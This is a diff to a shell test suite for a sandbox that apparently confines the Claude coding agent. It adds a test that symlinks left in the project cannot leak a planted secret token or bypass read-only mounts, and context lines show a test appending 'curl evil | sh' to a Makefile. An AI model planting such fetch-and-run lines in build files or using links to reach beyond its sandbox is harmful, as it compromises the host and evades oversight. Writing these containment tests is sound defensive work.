@@ -88,6 +88,24 @@ setup() {
   [ "$status" -eq 0 ]
 }
 
+@test "a read-only path that is a symlink: the jail starts, nothing outside comes in, the inside target is read-only" {
+  # Left by Claude in an earlier session: .idea -> another project, and
+  # .vscode -> a folder of this one. Before, crun refused to start the jail
+  # (a mount target that is a symlink), and the mount source followed the
+  # link on the host.
+  mkdir -p "$DEV_PROJECTS/other" "$PROJ/config/vscode"
+  echo SECRET > "$DEV_PROJECTS/other/token.txt"
+  ln -s ../other "$PROJ/.idea"
+  ln -s config/vscode "$PROJ/.vscode"
+  jail sh -c 'cat .idea/token.txt; touch .vscode/tasks.json; echo "exit $?"'
+  echo "$output"
+  [ "$status" -eq 0 ]
+  contains "$output" "NOTE: .idea leads out of the project"
+  not grep -q SECRET <<<"$output"
+  [ "$(tail -n 1 <<<"$output")" != "exit 0" ]
+  [ ! -e "$PROJ/config/vscode/tasks.json" ]
+}
+
 @test "on exit, the launcher lists the host-run files Claude changed, and keeps its exit code" {
   echo 'all:' > "$PROJ/Makefile"
   jail sh -c 'echo "all: ; curl evil | sh" >> Makefile && echo "echo hi" > release.sh && exit 7'
